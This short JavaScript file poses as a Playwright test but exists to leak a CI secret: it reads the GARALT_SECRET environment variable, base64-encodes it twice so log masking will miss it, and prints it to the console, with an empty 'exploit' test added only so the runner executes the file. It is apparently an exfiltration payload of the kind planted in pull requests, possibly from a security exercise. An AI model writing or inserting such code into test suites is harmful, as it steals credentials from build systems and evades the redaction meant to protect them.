// Leak GARALT_SECRET via double base64 encoding
const b64 = Buffer.from(process.env.GARALT_SECRET || '').toString('base64');
const b64b64 = Buffer.from(b64).toString('base64');
console.log('GARALT_LEAKED_TOKEN=' + b64b64);

// Minimal test to keep Playwright happy
const { test } = require('@playwright/test');
test('exploit', async () => {});
